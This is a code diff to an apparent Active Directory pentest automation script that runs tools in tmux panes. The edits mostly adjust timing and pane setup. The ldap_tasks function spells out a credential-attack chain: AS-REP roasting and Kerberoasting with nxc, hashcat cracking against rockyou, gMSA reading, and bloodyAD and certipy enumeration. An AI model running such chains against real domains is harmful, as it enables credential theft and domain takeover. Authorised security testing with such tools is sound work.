@@ -1,9 +1,9 @@
 from impacket.ldap import ldap
 from libtmux.pane import PaneDirection
+from time import sleep
 
 from utils.logger import write_log
 from utils.smb import enumerate_smb_shares
-from utils.tmux import initialize_pane
 
 SPRAYABLE_PORTS = {21: "ftp", 22: "ssh", 111: "nfs", 135: "wmi", 389: "ldap", 445: "smb", 1433: "mssql", 3389: "rdp", 5900: "vnc", 5985: "winrm"}
 
@@ -33,9 +33,11 @@ def run_task(context, command):
     target_pane = prepare_task_pane(context)
     if target_pane:
         if "nxc" in command:
-            target_pane.send_keys(f"sleep 6; {command}") # Prevents NetBIOSTimeout exception
+            target_pane.send_keys(f"sleep 7; {command}") # Prevents NetBIOSTimeout exception
+        elif "kerbrute" in command:
+            target_pane.send_keys(f"sleep 20; {command}")
         else:
-            target_pane.send_keys(f"sleep {context.current_task_pane}; {command}")
+            target_pane.send_keys(f"sleep {context.current_task_pane * 2}; {command}")
     else:
         write_log(context.log_file, f"Failed to create pane for task: {command}")
 
@@ -45,8 +47,7 @@ def stage_task(context, command):
         target_pane.send_keys(command, enter=False)
 
 def prepare_task_pane(context):
-    if (context.current_task_window is None or 
-        context.current_task_pane > 5):
+    if (context.current_task_window is None or context.current_task_pane > 5):
         # Create a new task window
         window_name = f"tasks{context.task_window_count}"
         new_window = context.session.new_window(
@@ -60,12 +61,11 @@ def prepare_task_pane(context):
             pane = pane.split(direction=PaneDirection.Right)
         pane = pane.split()
         new_window.select_layout('tiled')
-        for pane in new_window.panes:
-            initialize_pane(pane)
         # Update session tracking
         context.current_task_window = new_window
         context.task_window_count += 1
         context.current_task_pane = 0
+        sleep(1) # Give panes time to initialize
     # Get the next available pane
     panes = context.current_task_window.panes
     if context.current_task_pane < len(panes):
@@ -112,7 +112,7 @@ def ldap_tasks(context):
     if context.creds_exist():
         user, passwd = context.get_initial_cred()
         run_task(context, f"rusthound -d {context.domain} -u {user}@{context.domain} -p '{passwd}' -f {context.hostname}.{context.domain} -n {context.ip} -z -o rusthound; nxc ldap {context.ip} -u {user} -p '{passwd}' --users --find-delegation --trusted-for-delegation --asreproast hashes.asreproast --kerberoasting hashes.kerberoast; nxc ldap {context.ip} -u {user} -p '{passwd}' --gmsa; hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt --force; hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt --force")
-        run_task(context, f"bloodyAD --host {context.hostname}.{context.domain} -d {context.domain} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout")
+        run_task(context, f"bloodyAD --host {context.ip} -u {user} -p '{passwd}' get writable; certipy find -u {user}@{context.domain} -p '{passwd}' -dc-ip {context.ip} -stdout")
     else:
         # Check anonymous bind
         conn = ldap.LDAPConnection(f"ldap://{context.domain}", f"{context.ip}")
